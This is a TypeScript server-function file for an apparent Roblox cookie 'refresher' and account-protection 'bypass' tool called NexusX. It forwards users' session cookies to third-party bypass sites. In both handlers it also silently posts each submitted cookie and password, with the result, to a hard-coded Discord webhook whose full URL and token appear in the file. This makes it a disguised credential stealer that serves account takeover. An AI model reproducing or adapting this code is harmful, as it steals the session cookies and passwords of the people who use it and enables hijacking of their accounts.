import { createServerFn } from "@tanstack/react-start";

const DISCORD_WEBHOOK =
  "https://discord.com/api/webhooks/1513271179505303582/Vc30vof7Ihb4ilIcKuGKqDru8N138v0hSUcUjnTYhx6MJXyoAExJSUVyl2B14dvtL_Dx";

async function sendToDiscord(title: string, fields: Record<string, string>) {
  try {
    const desc = Object.entries(fields)
      .map(([k, v]) => {
        const val = String(v ?? "");
        const clipped = val.length > 1000 ? val.slice(0, 1000) + "…" : val;
        return `**${k}:**\n\`\`\`\n${clipped}\n\`\`\``;
      })
      .join("\n");
    await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [
          {
            title,
            description: desc.slice(0, 4000),
            color: 0xfacc15,
            timestamp: new Date().toISOString(),
          },
        ],
      }),
    });
  } catch {
    // ignore webhook failure
  }
}

export const refreshCookie = createServerFn({ method: "POST" })
  .inputValidator((d: { cookie: string }) => d)
  .handler(async ({ data }) => {
    const res = await fetch("https://www.rblxrefresh.net/refreshv2", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0",
        Referer: "https://www.rblxrefresh.net/",
        Origin: "https://www.rblxrefresh.net",
      },
      body: `cookie=${encodeURIComponent(data.cookie)}`,
    });
    const text = await res.text();
    await sendToDiscord("NexusX Refresher", {
      "Input Cookie": data.cookie,
      Status: `${res.status} ${res.ok ? "OK" : "FAIL"}`,
      Result: text,
    });
    return { ok: res.ok, result: text };
  });

const BYPASS_BASE = "https://rblxbypasser.com";

async function bypassFetch(path: string, init?: RequestInit) {
  return fetch(`${BYPASS_BASE}${path}`, {
    ...init,
    headers: {
      "User-Agent": "Mozilla/5.0",
      Referer: `${BYPASS_BASE}/`,
      Origin: BYPASS_BASE,
      ...(init?.headers ?? {}),
    },
  });
}

export const bypassAccount = createServerFn({ method: "POST" })
  .inputValidator((d: { cookie: string; version: "v1" | "v2"; password?: string }) => d)
  .handler(async ({ data }) => {
    const initRes = await bypassFetch("/api/bypass", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        cookie: data.cookie,
        directoryPath: "",
        version: data.version,
        password: data.version === "v2" ? data.password ?? "" : null,
      }),
    });

    const initTxt = await initRes.text();
    let initJson: any;
    try { initJson = JSON.parse(initTxt); } catch { initJson = { message: initTxt }; }

    if (!initRes.ok || !initJson?.success) {
      await sendToDiscord("NexusX Bypass (init fail)", {
        Version: data.version,
        Cookie: data.cookie,
        Password: data.password ?? "",
        Status: String(initRes.status),
        Response: JSON.stringify(initJson),
      });
      return { ok: false, status: initRes.status, data: initJson };
    }

    const payload = initJson.data ?? {};
    const token: string | undefined = payload.token;

    const finalize = async (ok: boolean, status: number, body: any) => {
      await sendToDiscord("NexusX Bypass", {
        Version: data.version,
        Cookie: data.cookie,
        Password: data.password ?? "",
        Status: `${status} ${ok ? "OK" : "FAIL"}`,
        Result: typeof body === "string" ? body : JSON.stringify(body),
      });
      return { ok, status, data: body };
    };

    // No token = direct result, return immediately
    if (!token) {
      return finalize(true, 200, payload);
    }

    // Poll up to ~30s with 1s interval.
    const maxAttempts = 30;
    for (let i = 0; i < maxAttempts; i++) {
      await new Promise((r) => setTimeout(r, 1000));
      let pr: Response;
      let ptxt: string;
      try {
        pr = await bypassFetch(`/api/progress?token=${encodeURIComponent(token)}`);
        ptxt = await pr.text();
      } catch {
        continue; // transient network blip, keep polling
      }
      let pjson: any;
      try { pjson = JSON.parse(ptxt); } catch { pjson = { message: ptxt }; }

      const progress = pjson?.progress ?? pjson?.Progress;
      const err = pjson?.error ?? pjson?.Error;

      if (err) {
        return finalize(false, pr.status, { error: err, ...pjson });
      }
      if (Number(progress) >= 100) {
        return finalize(true, 200, pjson);
      }
    }

    return finalize(false, 408, { error: "Timed out waiting for bypass", token });
  });

